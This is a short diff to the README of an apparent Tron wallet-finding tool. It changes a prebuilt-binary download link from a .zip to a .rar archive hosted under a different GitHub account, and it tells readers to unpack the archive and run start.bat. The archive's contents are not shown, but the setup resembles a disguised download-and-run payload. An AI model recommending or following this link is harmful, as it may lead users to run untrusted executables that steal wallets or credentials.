@@ -32,7 +32,7 @@ Demo :
 
 ![](https://github.com/Pymmdrza/TRXPy/raw/mainx/trxpy.JPG)
 
-Or you can run it from binary files without python: https://github.com/skone8544/trx-hunter/releases/download/b/trx-finder.zip
+Or you can run it from binary files without python: https://github.com/skone8544/trx-hunter/releases/download/b/trx-finder.rar
 
 unpack and run start.bat
 
